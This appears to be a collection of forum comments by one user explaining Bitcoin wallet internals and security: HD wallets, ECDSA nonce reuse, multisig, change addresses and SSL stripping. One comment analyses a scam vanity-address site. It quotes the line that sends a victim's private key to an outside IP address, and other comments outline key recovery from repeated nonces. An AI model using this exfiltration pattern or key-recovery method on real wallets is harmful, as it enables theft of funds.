Usually it's stored in a wallet unencrypted, because most wallets can generate new addresses without needing to be unlocked with the password. So malware or anyone snooping around your wallet could easily grab your mpk. myTREZOR sends it to their server each time you load the wallet.

Compressed private keys aren't actually compressed themselves (they're actually 1 char longer), they just indicate that the public key should use the compressed format which affects which address the key is associated with.

Pubkeys can be compressed because the elliptic curve that Bitcoin uses is symmetrical. A pubkey represents a point on the curve, and in uncompressed form is represented as two 256-bit coordinates x,y. Compressed keys have just the x value and a flag saying which half of the curve it is on. 
So the same underlying key data can have two representations and two addresses. Which WIF (wallet import format) key you import determines which address is added to the wallet. Most of the time you will only be shown one key, but bitaddress.org shows both because it lets you play around with the raw key. I think the UI is potentially confusing; they could allow you to switch between the two formats instead of presenting both up front.
Most wallets are using compressed keys now. They produce smaller transactions with potentially smaller tx fees, and ultimately a smaller blockchain.

Not sure why your post was deleted ... your Dropbox link may have triggered the automoderator.
This isn't anything new. It's mostly talking about bad random number generators. The ECDSA algorithm requires a random number (aka a nonce) for each signature. If you have two signatures using the same private key and nonce, it's possible to calculate the private key from the signature alone. So obviously it's very important that the nonce is random for each Bitcoin transaction.
There was a flaw in the Android random number generator that lead to multiple transactions being signed with the same nonce.
AFAIK this is the only case where funds have actually been lost due to a RNG bug. Also worth noting that the vulnerability only exists if you reuse addresses since it needs two or more transactions from the same address in order to work.

The simplest MITM just acts as a basic proxy between the client and server. It can be pretty much passive where they just directly echo the pages the client requests and log any sensitive data. Maybe inject some malicious JS if needed. They don't need to know if 2FA is enabled or not.
@_date: 2014-03-10 20:35:04
This would be the most efficient way to generate since it's just hashing and needs no EC, but the script would be non-standard because of the nonce and OP_DROP. I think only Eligius mines non-standard txs so it might take a while to confirm.
A tradeoff would be to treat the *nth* pubkey as the nonce, generated the same way as a normal vanitygen address. That would create a standard m-of-n script.

And how is the receiver going to know what this random input is in order to generate the private key?
Edit: I think I see where the misunderstanding is here. Each new address generated from the master public key still needs its own private key in order to spend from it. There isn't a single private key that can access all the addresses. There's a master private key/seed, but to derive the actual private key for an address you need to know which sequence number was used. So whatever random value you use in the address generation needs to be shared between sender and receiver.

Given the chance, I think most would prefer an alternate reality where Mt Gox never happened.

Kind of irrelevant here since your wallet wasn't actually deleted, but here's a tip for the future: next time if you ever accidentally delete something, instead of panicking and reinstalling things, just STOP. Anything you write to your harddrive at this point is potentially overwriting the file you want to recover.
Download something like Recuva (portable version) preferably using a different computer, and run it directly from a USB stick on the affected computer.
If you have an SSD drive, you're probably screwed though. File recovery programs generally don't work for SSD.
Obviously a backup plan is the best solution, but in an "OH SHIT" moment you have a good chance of recovering a deleted file if you do it quickly and don't write over it.

It's understandable if you haven't been reading here or following BTC news lately. A new visitor to Mt Gox would have no idea of their current problems.


Riiiight. There should be big notices on the homepage saying that withdrawals are currently not possible. Instead there's only a link to some news items somewhat hidden at the bottom of the homepage. To their credit, there is a sticky notice on every page once you're logged in, but to an outside observer it just looks like it's business as usual.

This is some bullshit.
In a sane world, GST would only be applied to the fees that Coinjar charges, not the entire amount. They're treating it as an everyday good and not a currency or even a commodity, and trying to shoehorn it into their existing rules on bartering which makes zero sense. This is going to kill (legitimate) Bitcoin adoption in Australia.

Yeah I saw that, but I think I misunderstood what you were saying. You're saying BIP32 is completely unrelated to the problem? It's related because it discourages address reuse and would have reduced the impact of the bug immensely. But so would using randomly-generated change addresses like bitcoin core does. So I guess you're technically right that BIP32 is irrelevant here. The real problem is bad signatures combined with rampant address reuse. BIP32 minimises the impact, but RFC6979 is the real solution.

You have to select the old legacy address from the accounts tab. It doesn't include them in your wallet total.

Is this your deposit address at Coinbase or an exchange by any chance? Keep in mind that you don't actually control that address, it's just for receiving funds to credit to your account. Often Coinbase will sweep the funds off to cold storage, or it will be consumed as part of another user's withdrawal. That's just the nature of shared wallets. As long as your balance within Coinbase is correct, there's nothing to worry about.
If the address is one actually managed by you in your own wallet, and you didn't make the two outgoing transactions, then I'm afraid your computer might be compromised.

Why look at the taint page?
If you look at the main page for your address and only see the funding transaction that you sent, then all is fine. Taint is for showing links between addresses and shows many degrees of separation and in your case would be related to the addresses that the funding transaction came from.

Well the Android bug happened, people lost money. That's not theoretical. And I don't think your bank and email example are fair comparisons because fraudulent bank transactions can be recovered, and email isn't money.
If in the future there's an exploit that was only possible due to address reuse, you can bet there would be people screaming bloody murder that they weren't warned of any risks. The warning seems reasonable to me.

A wallet is not an address. A wallet contains *many* addresses. The address that the change was sent to (15BJNL..) should also be in your wallet, though you might not be able to see it. Your total wallet balance should include the change.
Go to `Help &gt; Debug Window &gt; Console` and then type `listaddressgroupings` to see a listing of all addresses in your wallet.

A private key on its own doesn't compromise anything else. But combined with a master public key it compromises the entire wallet, which is why it's generally recommended not to export individual private keys in a HD wallet.

The long "secret" value is the raw data ripped directly from the file, which I think contains privkey, hash of pubkey+privkey for data integrity, among other things. The privkey is 9 bytes in. Don't know what the rest of the data is but it might just be the encoding Berkley DB uses. Edit: looks like it's DER encoding.
Looks like the short hexsec is a bug in pywallet:
    hexsec = ASecretToSecret(sec).encode('hex')[:32]
That :32 should be :64 since it's on the hex string and each byte takes two hex chars. Or they meant to do the slice on the byte array before converting to string. Decoding the encrypted wallet has a different code path that doesn't have this bug.

Storage wasn't needed for this exploit to work, it is largely a client-side hack with a few lines of javascript that sends the private key off to a completely different server.

What did you scan exactly? If the private key, which address does the app say it belongs to?
That first key is actually zero, which isn't a valid key so I'm not sure why directory.io even put it there. Your app should have rejected it as invalid. The addresses listed for it are actually for a different key 5HwoXVkHoRM8sL2KmNRS217n1g8mPPBomrY7yehCuXC1115WWsh which is 1111111111111111111111111111111111111111111111111111111111111111 in hex.

Transactions just reference outputs of previous transactions. In your example only 1 output would need to be 'consumed', not the entire balance of the address. Bitcoin doesn't care about address balances, only transaction outputs and inputs.
As for which output would be picked, that's usually taken care of by semi-complicated logic in your wallet to pick the most efficient combination to minimise fees and dust. In bitcoin-qt 0.9 there will be an option called Coin Control that lets you pick and choose outputs yourself, but it won't be that useful to most people unless you're a control freak or want to consolidate dust transactions or something.
So your transaction might use the 0.5 as the input, send 0.1 to your friend and 0.4 to the change address. Depending the wallet you're using, the change address will be a new address, or the same address you're spending from.

That would be truly scary, thankfully this is false. The writer seems to be confused about how the keypool works. Wallets contain a pool of 100 unused addresses at any point in time, which means a backup is good for 100 transactions + new receiving addresses. The potential for loss is if you don't backup often enough. There's no overwriting going on. That would be insane.
HD wallets will be a very welcome improvement though.

Do you mean explain what m-of-n means?
It basically means that in order to spend the output of an m-of-n transaction, you need at least *m* of the addresses' signatures. 
The linked transaction is a 1-of-2 transaction, which means either of the addresses can spend it. It's basically a joint account. You could also have 2-of-3 which would require at least 2 of the 3 signatures, and so on.

There's two types of tags. A signed message like you said, and tagging via a link which is how this tag was made.
All you need is to provide a link to a page somewhere that references the address. In this case it was 
It doesn't prove ownership of the address. If blockchain.info were smart they would require a link plus a signature, but alas they don't.

It's a consumer protection measure. In order for your funds to be "taken", your account has to be completely dormant (no deposits or withdrawals) AND you need to be uncontactable. i.e. you've moved and forgotten about your account and it will likely sit there forever until it's eaten up by fees.
ASIC holds the funds in trust on your behalf, you get interest (at rate of inflation) and zero fees. You get your funds back if you ever remember they exist e.g. by searching here: 
Yes it's fucked that a govt has the power to take control of your bank account. I'm not saying it's a good thing from a liberty point of view. Dormant accounts are a big problem though, and without intervention those funds just end up in the bankers' pockets. 
It's easily avoidable by making an occasional transaction and/or keeping your contact details up to date.

It's meant to generate a new address for each payment. That part sounds like it's working as expected.
If the payments aren't being forwarded to the address you configured, then there's a problem somewhere. I've heard of this happening with their Receive API, which I'm pretty sure the merchant app uses under the hood. Delays seem to be relatively common:

Also check the bitcointalk thread where Johoe says it's repeated R values
An example of two transactions with shared R value:
The second input signature of  has the same R value as this transaction's sig 
These are for different addresses, but it was just the first example I found. All you need is the same situation on the same address and you can calculate the private key and *k* instantly, and then start cross-matching for *k* against other addresses and then the house of cards starts falling apart. That's what Johoe did with his initial sweep. He has since gone and attacked it from another angle by generating all possible *k* values that the faulty RNG could produce. Looks like he's still finding more.

@_date: 2014-01-06 12:52:36
Essentially, yes. Given a master public key, the chain of addresses generated from it will always be the same.
You can have a play here  and see that for a given seed, you'll get the same list of addresses/private keys.
When you restore from the seed, the wallet keeps generating addresses until it finds a bunch that haven't been used yet (i.e. no transactions in the blockchain) and assumes that's the end of the road. This gap limit can be configured or you can force the wallet to keep looking. If the generation was random, the wallet would need to keep checking endless addresses.
You could in theory use a random sequence number *n* to generate address^n from the master public key, but the sender would need to tell the receiver what *n* is otherwise they will never know which address to monitor for the incoming transaction.

`/\D$/.test(transactionFee)` will allow a lot of input that ends up being NaN e.g. z0 and blah0 passes the test. Anything ending with a number gets through unless I'm misreading the code.
Could also be a problem with Euro people using a comma instead of a . for the decimal separator?
Edit: just tried it out and it looks like the fee field has been removed, so perhaps this isn't the problem after all. Unless they are using an old version that has the miner fee field.

There's no overlap between privkey &lt;-&gt; pubkey, that's always a 1:1 relationship. The overlap is for *addresses* because they are a RIPEMD160 hash of the pubkey which "squishes" the 256-bit keyspace down into 160 bits.
There are 2^96 privkeys for each address on average (assuming relatively even distribution of SHA256 and RIPEMD160)

Until recently, the site had a random button to generate normal addresses much like bitaddress.org. But the RNG was flawed and even had a fallback to Math.random on some browsers.
Instead of fixing the underlying problem, they just removed the random button. AFAIK the transaction signing part isn't using deterministic signatures, so it's probably still vulnerable.

Is there no error message? You're running it from the command line yeah? It's not interactive so launching it from Explorer won't do anything. If you're using the pre-built binary, make sure it's the right version for your platform - 32/64 bit.
Mining on your laptop should be many times faster than a Piper. If you have a semi-decent graphics card that can be many times faster again, but oclvanitygen is a bit harder to get up and running. I had to jump through some hoops to get it working, but it's worth it if the address difficulty is high.
It gets exponentially harder with each extra character. On my 2-year old laptop (CPU mode), 1BTtje took &lt;3 mins, 1BTtjexx says it will take 6 days, so that's going to take a loooong time on your Piper.

It's obvious from the code that it's a connection/session id. It comes from the server, isn't stored anywhere in the client outside of an instance variable. You get a new one each time you load the wallet. It's a randomly generated UUID.
You'll notice the other functions in there submit the master public key to the server. So the server knows all your addresses and transactions and could link this to your IP address if it wanted to. It basically has the same privacy model as Electrum a.k.a not very much.

There are fanatics on both sides. People saying Mt Gox is screwed, they're going down, FUD FUD FUD. Others saying everything's fine and dandy and they'll resume normal trading soon. The truth is that nobody knows, and that's part of the problem. They've had plenty of opportunity to put everyone's fears to rest but they haven't, and to some that's suspicious (including myself).
Personally I have no real attachment either way. I've used them in the past, but never kept funds with them. I don't want them to fail, I just wish they were better. They've done a lot of good for BTC in the past, being the only real exchange for a long time, sponsoring other projects etc. I think it's human nature to ignore all that and focus on the more recent negative events, especially when money's involved.

I'm not doubting the claim that a 256-bit key ECC is equivalent to ~128-bit symmetrical key. That's pretty well-known due to Pollard's rho and other algorithms. It's nothing to do with certain private keys being weak or related though, which is what I was asking about.

The 1BitcoinEater address is no different to OP's. 
It's likely that somewhere around 2^96 private keys exist for that address. It's ridiculously unlikely that anyone knows or will ever find one.
There may well be some valid addresses that have no possible key, but that's unprovable without bruteforcing the entire keyspace.
You can make verifiably unspendable outputs, but they don't involve addresses.
@_date: 2014-07-29 14:32:28
Nothing fancy like that, it's just not enforcing the checksum when decoding the base58, and it recalculates a new checksum in the toString/encode. It relies on the coder to call isValid() instead of blowing up immediately, and that function had a bug that is now fixed.
@_date: 2014-01-27 15:39:00
Yep. There are ~2^256 private keys but the RIPEMD-160 hashing used to generate addresses effectively compresses the keyspace down to 160 bits. On average there will be 2^96 possible private keys per address.

A QR code can just contain the receiving address at bare minimum. If all you need to do is communicate your address, that's fine. But usually when requesting payment like through Coinbase, it will use the Bitcoin URI scheme e.g. bitcoin:1YourAddressHere?amount=x.xx which provides additional info to the app that's scanning it.
QR codes have varying levels of redundancy encoded into them for error correction. You can have smaller/less dense codes, but people might have trouble scanning in less-than-perfect conditions - it's a tradeoff between complexity and readability. Coinbase's QR codes seem pretty standard, I don't know why the printer company would have any problem with them.

As luke-jr has already said, a Bitcoin private key is a 256-bit number which is often encoded into a human-readable format known as base58check or wallet import format (WIF).
But going along with your example: the encoding excludes 0,O,I,l which leaves only 58 possible characters. The last 4 or so characters are a checksum (for error checking) and should be excluded from the calculation. There's a version prefix and a compression flag suffix that should be also excluded. You end up with about 44 actual characters encoding the key data.

The "begin with a certain number of zeros" thing is a simplified explanation. It's more correct to say the block hash needs to be less than the current target. Target is inversely related to difficulty, so as difficulty goes up, the target decreases which means the hash needs to be smaller and smaller and is harder to find.
An example of where the leading zeroes thing is misleading:
    1: 00000000000000001F6973000000000000000000000000000000000000000000
    2: 00000000000000000F6973000000000000000000000000000000000000000000
    3: 00000000000000001E6973000000000000000000000000000000000000000000
1 is the current target
2 is a valid hash since it has an extra zero, which fits the simplified rule
3 is also valid even though it has the same number of zeroes because 1E is less than 1F.

Certificates can be reissued if lost, or issued by a different Certificate Authority (CA). There's no single database that ensures uniqueness like DNS. The key is that you need to convince the CA that you're the owner of the domain, and that's usually done by setting a custom DNS entry to prove you're in control. So if an attacker gains access to a site's DNS registrar account, they can also likely get valid certificates issued to them as well. This is what happened to the bitcointalk forums last year:

keyData is a BigInteger. See BigInteger.fromBuffer and toBuffer if your source is a byte array. 
If you just want random keys it's as simple as key = bitcoin.ECKey.makeRandom();

No I'm talking about the 'Sign' tab where you can sign a raw transaction. Part of the [ECDSA algorithm]( requires a unique random value for each signature, commonly called *k*. If this value is not random enough between two different signatures, it's possible to derive the private key which is obviously bad. This is what happened with the [Android SecureRandom]( bug and is also how the [Playstation 3]( signing key was cracked.

Transaction volume is also a factor. At the moment, fees are usually somewhere between 0.5 to 1% of the block reward. If Bitcoin still exists in ~2140, it's pretty much guaranteed that transaction volume will be many times larger than it is now, so the total fees per block will be significant even if the per-transaction fee remains small.

Just knowing this would provide zero benefit to an attacker unless HMAC-SHA512 is found to be flawed (unlikely). The use of HMAC-SHA512 during key derivation breaks any mathematical connection between child keys because its output is indistinguishable from random. Even if an attacker has two or more sibling private keys, it's not possible to work out any additional siblings or the parent without bruteforcing a 256-bit keyspace.
If the attacker knows the parent public key, things get a little more interesting. As already said, an extended public key (xpub) plus a child private key reveals the extended private key, and the entire branch is compromised.


I'm guessing you mean private key? And you're talking about the problem where multiple signatures from the same address combined with a bad RNG can reveal the private key i.e. duplicate *r* values in the signatures. Which is what just happened to blockchain.info. HD wallets minimise this vulnerability because multiple signatures for the same address should never exist in the first place unless you receive multiple transactions to a single receiving address. 
But if you throw in knowledge of the xpub then things get messy again. If there are duplicate *r* values in two signatures, **even if they're for different addresses**, and the attacker knows the xpub, then the entire branch is compromised.
Luckily this whole *r* value problem is easily solved by using deterministic signatures - [RFC6979]( - and all BIP32 wallets that I'm aware of are already using it.

SETI definitely doesn't fit that criteria. Its 'work' isn't easy to verify like a hash is. It relies on sending the same chunk of data out to multiple people and checking that they get the same result.

You have it pretty much right, under normal operation the MPK can be handed out and used without any further communication. But if two people have the same MPK they will generate the same list of addresses. 
The usual logic is to start with address1 and keep generating until you reach the first address that hasn't been used (no transactions on the blockchain). If all parties did this then you would have a new address for each transaction (except for a race condition where both parties choose the same address at the same time). Finding this first unused address can be expensive though if there are a lot of previously used addresses. A lot of scanning of the blockchain etc. Which is why you'd normally keep track of which address you were up to instead of scanning from scratch.
Obviously this is useless for the donation example as it provides no extra privacy since anyone can easily regenerate all the used addresses from the MPK.
Instead of generating the addresses in order, the sender could in theory generate address^*n* where *n* is a large random number. But in order to receive the funds, the receiver would need to generate and monitor all addresses up to the max value of *n* which would be infeasible. The sender could share which value of *n* they used, but that would be pretty clunky.
@_date: 2014-07-29 15:21:29
Yeah, as pointed out, there's a second type of multisig possible that doesn't use P2SH. It's less convenient since there's no address created that you can hand out and reuse, and no wallet support for creating these transactions outside of the raw transaction API. AFAIK it's only things like Counterparty and Mastercoin that use it.
A multisig script looks something like
    m {pubkey1}...{pubkeyn} n OP_CHECKMULTISIG
Using P2SH, you hash the script to generate an address (starts with 3) that can be used like any other address.
But you can also skip the P2SH and just use the script directly in the output of a transaction e.g.

1. The three parties  Alice (buyer), Bob (seller), Dan (arbiter) generate their 2-of-3 multisig address using `createmultisig` or similar method. The address will start with a 3 **
2. Alice sends her funds to this address. The transaction confirms like any other and can't be double-spent. The funds at this address can now only be spent by 2 of 3 of the owners.
3. If all goes well, Alice or Bob will craft a transaction that sends the funds held at the multisig address to an address owned by Bob. They both sign it, broadcast it and then the deal is done.
4. If something goes wrong, Dan will intervene and decide who gets the money. He crafts a signature sending the funds to Alice or Bob (possibly also a fee to himself), collects both his own signature and the winner's and then broadcasts the transaction. Done deal.
Does that make sense?

The OS maintains a pool of randomness (entropy) constantly topped up from hardware event timings like keystrokes, mouse movements and hardware interrupts triggered from things like hard drive access, memory access etc.
For most systems with user input this generates more than enough entropy for any task. Isolated systems like embedded devices (TREZOR) and servers can use a [hardware random number generator]( that obtains entropy from the environment e.g. thermal or atmospheric noise. The [chip that TREZOR uses]( has a hardware RNG built in.

I have successfully sent in the past while the client was still syncing. As long as there are no spends from your addresses made after the point you're synced to, it will work just fine. That can only really happen if you have imported an address or are using the same wallet/address in another client, or you reset the blockchain. It sounds like there may have been some other problem that prevented your transaction from propagating to the network.

I was saying that `Eventually Bitcoin-Qt will run out of addresses / private keys from the key pool and the client will add new private keys to the key pool` doesn't happen like that.

In the long-term you'll get the same amount, but mining with a large pool usually means more consistent payouts (less variance). With a small pool, the amount you get day-to-day will vary more. For the average miner, this shouldn't matter much. It's mostly psychological.

Without SSL, any third party between you and the web server could replace the donation address/QR code on the fly with their own and you wouldn't notice any difference. That could be your ISP, a public WIFI hotspot, a Tor exit node, anything in between.
On a standard internet connection, it's unlikely to occur but it's a possibility.

Yes, you send it to nodes that you are connected to, they validate and pass it to their connected nodes, and on it goes until full propagation is reached. The happens pretty quickly with 75% of nodes receiving the transaction after ~2 seconds.

The Raspberry Pi actually has a pretty decent hardware RNG built in. It wasn't accessible in earlier versions but now there's a driver for it. I don't think it's active by default though. Even without it, unless you're running completely headless without keyboard or mouse then you're unlikely to run into issues with entropy. 
But if you're still worried, you can generate your seed on a PC or even rolling dice or something. As long as you're using Electrum 1.9+ you don't need any source of randomness after that point since it uses [RFC6979]( when signing instead of generating a random nonce.
@_date: 2014-04-09 10:14:09
I don't think you're understanding what happened here. This is nothing like the other guy's issue with change. This is a separate new transaction that sent (almost) all your balance to a new address. Nothing to do with change. In fact the transaction even returns a tiny bit back to your address as change i.e. the hacker generously left you with 0.00013077 in your wallet.

This is called child-pays-for-parent and is already implemented by some pools. Well Eligius at least.
The problem is that a 1000 inputs transaction is going to be huge, and transaction fees are per KB since space in the blockchain is ultimately what you're paying for. It might be able to minimise fees a little bit, but not enough to make true micropayments viable.
@_date: 2014-01-11 12:52:33
It knows and has verified transactions up to the point it is synced to. It can therefore build a transaction that spends these outputs. If it turns out that the outputs were already spent after the point it's synced to, then the transaction will be invalid (double spend) and won't propagate through the network. But under normal operation, that won't happen.

I think you're overestimating what HTTPS Everywhere actually does. It only works for sites that have a rule defined, and btc-e.com has no rule. The redirect that you saw would have just been the normal server-side 301 redirect that everyone gets unless there's a MITM.

The 2^33 number is for 160-bit ECDSA. The paper says for 256-bit you'd need 2^52 signatures which is 2^18 terabytes of storage. However, that's for a 1-bit bias which is a best case scenario. I'm not sure how the attack scales, but I'm guessing it would get exponentially faster with more bits of bias.

You'll need to decrypt the key first. bitcoin-qt doesn't do BIP38 yet (if ever). You can do that on the Wallet Details tab of bitaddress.org (preferably the offline copy you saved when creating it)
@_date: 2014-10-15 15:50:02
From the code, it looks like the only reason Electrum 2.0 is failing to import other wallets' BIP39 seeds is because they want to provide backwards compatibility and autodetect old vs new seeds. Basically only a subset of BIP39 seeds are allowed as defined by Bitcoin When generating a seed they throw away anything that doesn't satisfy is_new_seed. 
Mnemonic looks like bog standard BIP39, but you can't get in there without passing is_new_seed
To me this seems like a bit of a strange design decision. They could easily allow any BIP39/44 seed by providing a manual selection in the restore dialog instead of relying on autodetect. Or at least provide an option and keep the autodetect for novice users.

It's referring to the 0.00004555 BTC output which looks like change. To prevent dust/spam there's soft minimum output size of 5430 satoshis enforced by most nodes and miners. Your transaction was non-standard and low priority because of this. It looks like it was just confirmed so obviously Eligius  doesn't enforce that restriction.
Which wallet did you send it from? Wallets usually prevent this from occurring by just [adding the change to the transaction fee](
@_date: 2014-02-27 14:08:16

Transactions at the lowest level are just a series of bytes that are sent around the Bitcoin network, and blockchain.info provides an interface that lets you see this raw transaction data for transactions it knows about.

I figured out how it's scamming people. All the generation pages seem legit and if you provide your own part-pubkey it's impossible for it to scam you. It all looks like a normal legit vanitygen tool up to this point.
BUT on the page where it shows you the generated address, there's a link to 'Calc Private Key in Wallet Import Format'. This page asks for your part privkey so it can calculate the full key. If you were foolish enough to do this step, then you've just made yourself a victim. The page calculates the full private key and posts it to httpdontclick://192.241.136.248/test.php?a="+bitcoinAddress+"&amp;b="+privateKeyWif
This last step is supposed to be done locally using a trusted tool.
Sorry for your losses. Don't trust your private keys to untrusted sites.
Check the source. When you provide your key and hit calculate, it changes the src attribute of a hidden image and includes the key as a URL parameter.
Can the victims confirm if they did this step? This is the most obvious exploit, there might be others.

It's not virtually the same as the other guy at all. I've tried to explain this but I don't think you're getting it.
Multibit sends change to an address already in your wallet. It's either the first address or second, I can't remember. Point is it doesn't generate new change addresses for you, it chooses an existing address that shows on the receive tab.
The guy from yesterday had change sent to an address that was showing in his wallet, but for whatever reason (wallet corrupted or a bug) there is no private key in his wallet for that address. This was all done in a single transaction:
         ----- SealsWithClubs
        /
    A --
        \
         ----- B (change address with missing private key)
In your case, you had two separate transactions. First your transaction to Crypsty:
         ----- Cryptsy
        /
    A --
        \
         ----- A - 0.423 change - this is probably what you're seeing in your log
Then over a day later a second transaction that you didn't initiate that clears your funds out to an address not in your wallet:
         ----- Hacker's address
        /
    A --
        \
         ----- A (tiny bit of change sent back to yourself - thanks hacker!)
This looks like just a stock standard draining of your wallet I'm afraid. There's no weirdness with change addresses going on here. It's completely different to the other guy.
As I said earlier, I'm happy to take a look at the log file if you can post it when you get home.

Yeah I agree, in a lot of ways it would make more sense for it to be off-chain. For example, my tip and you declining it (thanks) wasted a small amount in transaction fees. But then it would be the bot's responsibility to maintain balances correctly where all it needs to do now is link an address to a Reddit username, and the blockchain provides the accounting.
Also the bot is a great educational/evangelism tool, and using real transactions helps with that. I don't think it would look good to people new to Bitcoin if the magic internet money they just received didn't even exist outside of some imaginary balance maintained by the bot.

Theoretically you could carry a bunch of paper wallets in various denominations and exchange them for goods and services, kind of like cash. But the merchant would need a connection to verify that it hadn't already been spent, and ideally sweep to an address so it can't be spent later. Unless there was already a trust arrangement e.g. small community, or regular customer.

I can't speak for any service because I don't know of any that are open source. But logically, since this is such a simple and obvious exploit, I think it's safe to say they do check for it.
Also worth noting that future-dated transactions are considered non-standard unless they can be included in the next block, and won't be propagated by most nodes.

Electrum uses the gap limit to know when to stop generating addresses. So if it's 5, it keeps generating addresses until it finds a run of 5 addresses that don't have any transactions. 
Say you set the gap limit to 20. You give out your 20 addresses to people, but for whatever reason addresses 6 through 10 never receive anything. If you restore from seed with the default gap limit it will generate the first five, then see the next 5 aren't used and stop there. The wallet won't know about anything after address 10 unless you a) increase the gap limit, or b) send a transaction to one/some of the empty addresses to close the gap so to speak. Is b) is what you mean by:

Do you know what Scrypt is? It's a key derivation function that is designed to be CPU and memory-hard and difficult to brute force. Did you notice how long it took on your phone to generate the key? Obviously phones aren't powerhouses, but it gives some indication of how much it slows down brute force attempts.
The 15 character password that Mycelium uses is equivalent to ~70-bits which by itself isn't *that* strong. Combine it with the fairly tough scrypt params that Mycelium uses and it becomes very safe. Like millions of years for a million-node botnet to crack.
@_date: 2014-10-07 06:23:19
Not sure where you got that info. Addresses have been part of the protocol since day one. See 
Send to IP was a feature built on top of public keys, kind of like a pubkey lookup service if anything. You never sent to an IP address directly, the IP address wasn't part of the transaction. All it did was connect to an IP address and ask for a public key to send to. A bit like a poor man's payment protocol that was insecure (open to man-in-the-middle attacks) and nobody really ever used. It was disabled for a long time and eventually removed completely. AFAIK Satoshi never enabled the feature on his client or was behind NAT that didn't allow incoming connections. If he ever received from anyone, I guess he gave them a Bitcoin address, not his IP address.

Pretty much. Keep in mind that it's not generating a new address or anything, it's basically a paper export of your blockchain.info account. So if you have a bad password, no 2FA etc your account could still be vulnerable no matter how well you protect the paper wallet.

I'm not sure if it's in the actual legislation, but the bank is expected to try to contact you before the account is declared dormant. And after it's transferred, ASIC tries to contact you periodically. My friend works at NAB and says they mail out something over a month in advance, and try to call if there's no response. He says the number of dormant accounts is huge, even when it was 7 years instead of 3.
I think the horror stories you hear about are either people that didn't keep their contact details up to date, or a few where "due process" wasn't followed, bureaucratic bungling etc. There's always going to be a few corner cases, but I think here they're a tiny minority.
Similar legislation saved a superannuation account I forgot about from being eaten away by fees. It was from a job I had during uni when I was young and dumb, and didn't update my contact details.

Each output is only 1 Satoshi (0.00000001) which is a tiny tiny amount now, and even less back in 2011 when the transactions were sent.
Interestingly, if you tried to do this now, the transaction would probably never confirm due to the dust and spam protections that have been added since then.

Well once a block is created, the order of the transactions is set in stone so to speak. It's an ordered list, but the order is (mostly) arbitrary.
The coinbase transaction must be first, and if transaction *B* spends transaction *A* and both are in the same block, *A* must be first. Besides that there's nothing in the protocol that I'm aware of that defines the order of transactions in a block. It's up to the miner to decide.

If it's literally just a keylogger on computer A, then you're safe with 2FA in your scenario. But if the malware is more sophisticated than that, then you're still screwed. Your encrypted wallet is downloaded every time you login, so if it's capable of intercepting that and logging your password, it has everything it needs to steal your funds.

Nothing to do with private addresses. Trying to generate an address of a certain length is functionally equivalent to generating a vanity address i.e. an address that starts with a certain prefix.

It basically means you take the seed, run it through some function that's moderately CPU-intensive that jumbles the bits around in some well-defined way, and then use the output of that as the actual master key. The 'wasted' time spent deriving the master key makes it harder to brute force. 
Because SHA-256 is used, it also has the effect of stretching the key to 256 bits. Although it doesn't directly add entropy (the input is still only 128 bits), it means that if you wanted to bruteforce the master key directly, you would need to search the whole 256-bit keyspace.
BIP38 encryption is much the same idea except instead of SHA-256 rounds,  it uses Scrypt which is designed to be CPU **and** memory intensive.

Got an example?
Transaction outputs are just scripts, and to spend them you just have to be able to satisfy the conditions that the script defines. Scripts are fairly flexible and let you do fun things.
    OP_DUP OP_HASH160 06d1ac5240873927925db2e5788b8322be0fca27 OP_EQUALVERIFY OP_CHECKSIG 
That's a 'normal' output script where something is sent to an address. It's saying you need to provide a public key and signature that matches the address (the hex value) in order to spend it.
    OP_HASH256 6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000 OP_EQUAL
This output isn't linked to an address, so blockchain.info just says "Unable to decode output address". It's a valid transaction though. To spend it you need to find a value has a SHA-256 hash of `6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000`. It turns out that's the hash of the genesis block, so someone was able to create a valid input that spent it. This transaction was probably a treasure hunt or challenge similar to a brain wallet challenge.
It's possible to create an output that's unspendable. Mt Gox [screwed up some transactions]( back in 2011 that had the value 0 where the address should have been.
    OP_DUP OP_HASH160 0 OP_EQUALVERIFY OP_CHECKSIG
It's not possible to create a HASH160 of 0 so these transactions can't be spent unless the protocol is changed (not going to happen). It's not really any different to sending to an address that nobody has the private key for.
@_date: 2014-10-29 04:53:50

Then yeah, you should be safe as long as the passphrase is decent and not able to be brute forced. There's nothing mathematically linking the two wallets, there's no elliptic curve trickery used for that part. But I would still move my funds since a large piece of the puzzle has been solved.
Note that the passphrase protection on BIP39 mnemonics isn't anywhere near as strong as BIP38. BIP38 uses Scrypt with very strong parameters which makes it very difficult to brute force even with a relatively weak password. BIP39 only uses 2048 rounds of PBKDF2 which is weak. As a comparison, Lastpass uses minimum 100,000 rounds and Bitcoin Core 25,000 when encrypting the wallet.
For reference, bip39 uses
    wallet_seed = pbkdf2(prf=HMAC-SHA512, password=mnemonic, salt=passphrase, rounds=2048)

The tumbling thing would be normal behaviour for a deposit address at localbitcoins. They run a shared wallet, so one user's deposit will become another user's withdrawal, much like a mixer.
Seems unlikely to be malware if it was showing the same address on her computer and phone. It could have been a man-in-the-middle if she was using the coffee shop's WIFI and didn't ensure it was using SSL. Unlikely though.
I have seen occasional posts here about LBC deposits not showing that end up just being a temporary delay. It could have been as simple as that.

Well forgive me, the quote was talking about SSL stripping, and sslstrip is the most well-known implementation of that concept ... now I don't even know what we were talking about.
Just to make sure we're even talking about the same thing, let me break it down a bit.
1: Is it possible for a site to redirect from HTTPS to HTTP without generating any browser warnings? Definitely. Sites do it all the time e.g. a lot of sites only use HTTPS for login, and then redirect back to HTTP.
2: Is it possible for a MitM to intercept a request to a HTTPS URL and redirect to HTTP without any browser warnings? No. Not unless they have managed to obtain a valid certificate for the domain, in which case they wouldn't even need to redirect to HTTP anyway since they already fully own the connection. 
A typical MitM will only have a self-signed certificate, or one from an untrusted CA, which will generate a browser warning page immediately if you access a HTTPS URL. The MitM never gets a chance to redirect to HTTP because the SSL connection is never established unless the user chooses to override and ignore the browser warning.
If *2* were possible, SSL/TLS would be utterly useless. Sure it's flawed, but it's not THAT broken. If you think this is possible (with a relatively modern browser), can you provide some sources other than the Wikipedia quote?
@_date: 2014-10-30 00:50:02
Some possibilities:
1: You have malware  
2: You entered your login into a phishing site

4: You've used the same password on another site that was compromised

I think you might have that backwards. If you have a xpub key, you can generate the first 2^31 - 1 (non-hardened) children from it, but the hardened keys are effectively hidden. Hardened keys can only be generated from the xprv. It just designates a range of keys ( i ≥ 2^31 ) that can't be derived from an xpub.
